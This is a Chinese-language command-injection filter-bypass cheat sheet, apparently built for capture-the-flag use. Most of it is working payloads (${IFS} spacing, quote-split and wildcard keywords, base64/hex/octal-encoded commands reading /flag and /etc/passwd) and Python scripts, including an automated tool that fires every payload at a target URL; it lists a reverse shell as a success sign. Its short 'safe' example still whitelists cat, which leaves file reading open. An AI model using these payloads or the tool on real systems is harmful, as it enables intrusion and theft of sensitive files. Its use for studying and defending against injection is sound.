# 命令注入-过滤绕过 攻击库

## 漏洞概述

命令注入过滤绕过是指在应用程序实施了黑名单过滤、输入验证或WAF防护的情况下,通过各种编码、混淆和shell特性来绕过限制,成功执行任意系统命令的攻击技术。

**攻击价值**:
- 绕过输入验证
- 突破黑名单过滤
- 规避WAF检测
- 执行任意系统命令
- 获取系统权限

**常见过滤**:
- 黑名单关键字(cat、ls、wget等)
- 特殊字符过滤(;、|、&等)
- 空格过滤
- 路径字符过滤(/、\等)

## 核心绕过技术

### 1. 命令分隔符绕过

**原理**: 使用各种命令分隔符执行多条命令

**被过滤**: `;`, `|`, `&`

**绕过载荷**:

```bash
# 使用换行符
command1%0acommand2
command1\ncommand2

# 使用&& (AND逻辑)
command1&&command2

# 使用|| (OR逻辑)
command1||command2

# 使用管道|
command1|command2

# 使用分号;
command1;command2

# 使用反引号``执行子命令
`command1`&&command2

# 使用$()执行子命令
$(command1)&&command2
```

**Python测试脚本**:

```python
def test_command_separators(target_url, param='cmd'):
    """测试命令分隔符"""
    
    separators = [
        '%0a',  # 换行
        '\\n',
        '&&',
        '||',
        '|',
        ';',
        '`',
        '$(',
    ]
    
    base_cmd = 'echo test'
    target_cmd = 'cat /flag'
    
    for sep in separators:
        if sep in ['`', '$(']:
            payload = f"{sep}{target_cmd}{sep if sep == '`' else ')'}"
        else:
            payload = f"{base_cmd}{sep}{target_cmd}"
        
        response = requests.get(target_url, params={param: payload})
        
        if 'flag' in response.text.lower():
            print(f"[+] 成功! 分隔符: {sep}")
            return payload
    
    return None
```

### 2. 空格绕过

**原理**: 使用其他字符代替空格

**被过滤**: 空格` `

**绕过载荷**:

```bash
# 使用${IFS}
cat${IFS}/etc/passwd
cat${IFS}flag.txt

# 使用$IFS$9
cat$IFS$9/etc/passwd

# 使用<>重定向
cat</etc/passwd
cat<flag.txt

# 使用Tab(\t)
cat\t/etc/passwd
cat%09/etc/passwd

# 使用{}大括号
{cat,/etc/passwd}

# 不使用空格
X=$'cat\x20/etc/passwd'&&$X
```

**自动化绕过脚本**:

```python
def bypass_space_filter(command):
    """生成绕过空格过滤的payload"""
    
    space_bypasses = []
    
    # 方法1: ${IFS}
    bypass1 = command.replace(' ', '${IFS}')
    space_bypasses.append(bypass1)
    
    # 方法2: $IFS$9
    bypass2 = command.replace(' ', '$IFS$9')
    space_bypasses.append(bypass2)
    
    # 方法3: Tab
    bypass3 = command.replace(' ', '%09')
    space_bypasses.append(bypass3)
    
    # 方法4: 大括号
    parts = command.split(' ')
    if len(parts) == 2:
        bypass4 = f"{{{parts[0]},{parts[1]}}}"
        space_bypasses.append(bypass4)
    
    return space_bypasses

# 使用示例
bypasses = bypass_space_filter('cat /flag')
for bypass in bypasses:
    print(bypass)
```

### 3. 黑名单关键字绕过

**被过滤**: `cat`, `ls`, `wget`, `curl`

**绕过方法**:

```bash
# A. 字符串拼接
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd

# B. 通配符
/???/??t /???/p?sswd
/bin/c?t /etc/pass*

# C. 变量替换
a=c;b=at;$a$b /etc/passwd
c=at;cmd=c$c;$cmd /etc/passwd

# D. Base64编码
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
`echo Y2F0IC9mbGFn | base64 -d`

# E. Hex编码
$(echo -e "\\x63\\x61\\x74 \\x2f\\x66\\x6c\\x61\\x67")

# F. 反斜杠转义
c\at /etc/passwd
ca\t /etc/passwd

# G. 通配符替代命令
/???/c?t /etc/passwd
```

**绕过生成脚本**:

```python
import base64

def bypass_keyword_blacklist(command):
    """绕过关键字黑名单"""
    
    bypasses = []
    
    # 方法1: 引号分割
    for keyword in ['cat', 'ls', 'wget', 'curl']:
        if keyword in command:
            # 单引号
            bypass1 = command.replace(keyword, f"{keyword[0]}'{keyword[1:]}")
            bypasses.append(bypass1)
            
            # 双引号
            bypass2 = command.replace(keyword, f'{keyword[0]}"{keyword[1:]}"')
            bypasses.append(bypass2)
    
    # 方法2: 反斜杠
    bypass3 = command.replace('cat', 'c\\at')
    bypasses.append(bypass3)
    
    # 方法3: Base64编码
    b64 = base64.b64encode(command.encode()).decode()
    bypass4 = f"echo {b64} | base64 -d | sh"
    bypasses.append(bypass4)
    
    # 方法4: Hex编码
    hex_cmd = ''.join([f'\\x{ord(c):02x}' for c in command])
    bypass5 = f'$(echo -e "{hex_cmd}")'
    bypasses.append(bypass5)
    
    return bypasses
```

### 4. 路径字符绕过

**被过滤**: `/`, `\`

**绕过方法**:

```bash
# 使用环境变量
$HOME/.bashrc
$PWD/flag.txt

# 使用${PATH}
${PATH:0:1}etc${PATH:0:1}passwd
# ${PATH:0:1} = /

# 使用反引号构造
`echo . | tr . /`

# 使用printf
$(printf '/etc/passwd')

# 使用通配符
*lag.txt
f?ag.txt
```

### 5. 通配符利用

**原理**: 使用shell通配符绕过过滤

**绕过载荷**:

```bash
# ? 匹配单个字符
/???/c?t /???/p?sswd  # /bin/cat /etc/passwd

# * 匹配任意字符
/*/ca* /*tc/pass*     # /bin/cat /etc/passwd

# [] 字符集合
/[b]in/[c]at /[e]tc/[p]asswd

# {} 大括号展开
/{b,usr,home}in/{c,s}at /{e,u}tc/{p,s}asswd
```

**自动化生成**:

```python
def generate_wildcard_payloads(command):
    """生成通配符绕过payload"""
    
    # 将每个字符替换为?
    wildcard1 = ''.join(['?' if c.isalnum() else c for c in command])
    
    # 部分字符使用通配符
    wildcard2 = command.replace('cat', 'c?t')
    wildcard3 = command.replace('/etc/', '/*tc/')
    
    # 使用*
    wildcard4 = command.replace('cat', 'ca*')
    
    return [wildcard1, wildcard2, wildcard3, wildcard4]
```

### 6. 环境变量利用

**原理**: 利用环境变量构造命令

**绕过载荷**:

```bash
# 使用$PATH
${PATH:0:1}  # 返回 /
${PATH:0:1}bin${PATH:0:1}cat

# 使用$HOME
$HOME/.bashrc

# 自定义变量
a=c;b=at;$a$b /flag

# 使用$0获取shell名称
$0  # 返回当前shell如/bin/bash
```

### 7. 命令替换绕过

**原理**: 使用命令替换执行隐藏的命令

**绕过载荷**:

```bash
# 反引号
`cat /flag`
`whoami`

# $()语法
$(cat /flag)
$(id)

# 嵌套命令替换
$($(echo cat) /flag)
`echo cat /flag | sh`
```

### 8. 编码绕过

**A. Base64编码**

```bash
# 编码整个命令
echo Y2F0IC9mbGFn | base64 -d | sh

# 编码参数
cat $(echo L2ZsYWc= | base64 -d)
```

**B. Hex编码**

```bash
# 使用echo -e
echo -e "\\x63\\x61\\x74 \\x2f\\x66\\x6c\\x61\\x67"

# 使用printf
$(printf '\\x63\\x61\\x74 \\x2f\\x66\\x6c\\x61\\x67')
```

**C. Octal编码**

```bash
# 八进制
echo -e "\\143\\141\\164 \\57\\146\\154\\141\\147"
```

**编码生成脚本**:

```python
import base64

def encode_command(command):
    """生成多种编码的命令"""
    
    encodings = {}
    
    # Base64
    encodings['base64'] = f"echo {base64.b64encode(command.encode()).decode()} | base64 -d | sh"
    
    # Hex
    hex_str = ''.join([f'\\x{ord(c):02x}' for c in command])
    encodings['hex'] = f'echo -e "{hex_str}"'
    
    # Octal
    oct_str = ''.join([f'\\{ord(c):03o}' for c in command])
    encodings['octal'] = f'echo -e "{oct_str}"'
    
    return encodings
```

### 9. 特殊shell技巧

**A. 参数扩展**

```bash
# ${parameter:offset:length}
${PATH:0:1}  # 获取/

# ${parameter/pattern/string}
a=/flag;${a/f/c}  # 替换
```

**B. Here Document**

```bash
# 使用<<
cat <<EOF
flag内容
EOF

# 执行命令
sh <<EOF
cat /flag
EOF
```

**C. 进程替换**

```bash
# <()
cat <(echo flag)

# >()
cat /flag >(grep flag)
```

### 10. 文件名注入

**原理**: 利用文件名执行命令

**场景**: 应用执行类似`ls $input`的命令

**绕过载荷**:

```bash
# 创建文件名包含命令
touch -- -la  # ls会执行ls -la

# 使用换行符
touch $'test\ncat /flag'
```

## 综合绕过工具

```python
#!/usr/bin/env python3
import requests
import base64
import urllib.parse

class CommandInjectionBypass:
    """命令注入过滤绕过工具"""
    
    def __init__(self, target_url, param='cmd'):
        self.target_url = target_url
        self.param = param
    
    def space_bypass(self, command):
        """空格绕过"""
        return [
            command.replace(' ', '${IFS}'),
            command.replace(' ', '$IFS$9'),
            command.replace(' ', '%09'),
            command.replace(' ', '\\t'),
        ]
    
    def keyword_bypass(self, command):
        """关键字绕过"""
        bypasses = []
        
        # 引号分割
        if 'cat' in command:
            bypasses.append(command.replace('cat', "c'a't"))
            bypasses.append(command.replace('cat', 'c"a"t'))
            bypasses.append(command.replace('cat', 'c\\at'))
        
        # Base64
        b64 = base64.b64encode(command.encode()).decode()
        bypasses.append(f"echo {b64}|base64 -d|sh")
        
        # Hex
        hex_cmd = ''.join([f'\\x{ord(c):02x}' for c in command])
        bypasses.append(f'echo -e "{hex_cmd}"')
        
        return bypasses
    
    def path_bypass(self, command):
        """路径字符绕过"""
        return [
            command.replace('/', '${PATH:0:1}'),
            command.replace('/flag', '*lag'),
            command.replace('/flag', '?flag'),
        ]
    
    def wildcard_bypass(self, command):
        """通配符绕过"""
        bypasses = []
        
        if 'cat' in command:
            bypasses.append(command.replace('cat', 'c?t'))
            bypasses.append(command.replace('cat', 'ca*'))
            bypasses.append(command.replace('/bin/cat', '/???/c?t'))
        
        return bypasses
    
    def generate_all_bypasses(self, base_command):
        """生成所有绕过payload"""
        
        all_bypasses = []
        
        # 空格绕过
        all_bypasses.extend(self.space_bypass(base_command))
        
        # 关键字绕过
        all_bypasses.extend(self.keyword_bypass(base_command))
        
        # 路径绕过
        all_bypasses.extend(self.path_bypass(base_command))
        
        # 通配符绕过
        all_bypasses.extend(self.wildcard_bypass(base_command))
        
        # 命令替换
        all_bypasses.append(f"$({base_command})")
        all_bypasses.append(f"`{base_command}`")
        
        # 去重
        return list(set(all_bypasses))
    
    def test_bypass(self, base_command='cat /flag'):
        """测试绕过"""
        
        print(f"[*] 基础命令: {base_command}\n")
        print(f"[*] 生成绕过payload...\n")
        
        bypasses = self.generate_all_bypasses(base_command)
        
        print(f"[*] 生成了 {len(bypasses)} 个绕过payload\n")
        
        for i, payload in enumerate(bypasses, 1):
            print(f"[{i}/{len(bypasses)}] 测试: {payload[:70]}...")
            
            try:
                response = requests.get(
                    self.target_url,
                    params={self.param: payload},
                    timeout=5
                )
                
                if response.status_code == 200:
                    if 'flag' in response.text.lower():
                        print(f"  [+] 成功! 发现flag!")
                        print(f"  [+] Payload: {payload}")
                        return payload, response.text
                    
                    elif len(response.text) > 0:
                        print(f"  [?] 返回内容长度: {len(response.text)}")
                
                elif response.status_code == 403:
                    print(f"  [-] 被过滤")
            
            except Exception as e:
                print(f"  [!] 错误: {e}")
        
        return None, None
    
    def auto_exploit(self):
        """自动化利用"""
        
        print(f"\n{'='*60}")
        print(f"命令注入过滤绕过测试")
        print(f"{'='*60}\n")
        
        # 测试命令列表
        test_commands = [
            'cat /flag',
            'cat flag.txt',
            'ls -la',
            'id',
            'whoami',
        ]
        
        for cmd in test_commands:
            print(f"\n{'='*60}")
            print(f"测试命令: {cmd}")
            print(f"{'='*60}\n")
            
            success_payload, response = self.test_bypass(cmd)
            
            if success_payload:
                print(f"\n[+] 成功payload: {success_payload}")
                print(f"[+] 响应: {response[:500]}")
                return True
        
        return False

# 使用示例
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("用法: python3 cmd_injection_bypass.py <target_url> [param]")
        print("示例: python3 cmd_injection_bypass.py http://target.com/exec cmd")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'cmd'
    
    bypass = CommandInjectionBypass(target, param)
    bypass.auto_exploit()
```

## 实战案例

### 案例1: 绕过空格和分号过滤

```bash
# 被过滤: 空格和;
# 原命令: cat /flag
# 绕过: cat${IFS}/flag
```

### 案例2: 绕过cat关键字

```bash
# 被过滤: cat
# 绕过方法:
c'a't /flag
c"a"t /flag
c\at /flag
/???/c?t /flag
```

### 案例3: 完全无空格命令执行

```bash
# 使用大括号
{cat,/flag}

# 使用重定向
cat</flag

# 使用${IFS}
cat${IFS}/flag
```

## 防御措施

**安全的实现**:

```python
import subprocess
import shlex

def safe_execute(user_input):
    """安全的命令执行"""
    
    # 方法1: 白名单验证
    allowed_commands = ['ls', 'cat', 'pwd']
    
    # 解析命令
    try:
        parts = shlex.split(user_input)
    except:
        return "Invalid command"
    
    if parts[0] not in allowed_commands:
        return "Command not allowed"
    
    # 使用subprocess安全执行
    try:
        result = subprocess.run(
            parts,
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.stdout
    except:
        return "Execution failed"
```

## 关键成功要点

1. **理解过滤机制**: 分析哪些字符被过滤
2. **组合技术**: 混合多种绕过方法
3. **Shell特性**: 深入理解shell语法特性
4. **编码技巧**: 善用各种编码方式
5. **迭代测试**: 不断调整payload

## 成功标志

- 绕过过滤执行任意命令
- 读取敏感文件如/etc/passwd
- 执行系统命令获取输出
- 读取flag文件
- 建立反向shell
